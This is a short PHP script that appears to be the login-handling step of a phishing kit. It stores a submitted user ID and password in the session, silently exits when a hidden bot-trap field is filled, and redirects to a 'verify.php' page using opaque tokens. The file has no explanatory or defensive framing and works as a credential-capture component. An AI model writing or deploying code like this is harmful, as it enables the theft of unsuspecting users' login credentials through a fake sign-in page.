<?php
error_reporting(E_ALL);
ob_start();
session_start();

/** form fields **/

$_SESSION['UserID'] = $username = $_POST['userid'];
$_SESSION['PassCode'] = $passwd = $_POST['pss'];
$wizard = $_POST['wiz'];
if (isset($wizard) && !empty($wizard)) {
	
	die();
	
	}else {
		
		if ($username == "" || $passwd == "") {
			
			$error = "null_entry";
			$uri = "_8291c5634d9d&";
			header ("Location: ./?error=$error&uri=$uri&p=$username");
			
		}else {




	
//Exiting
//Exiting
$asp = "_8291c5634d9d&";
$top = "Recessauth.app";
$Redirect = "verify.php?top=$top&crumb=$asp&error=false";

header("Location: $Redirect").md5(time());	
	

	}
	}
?>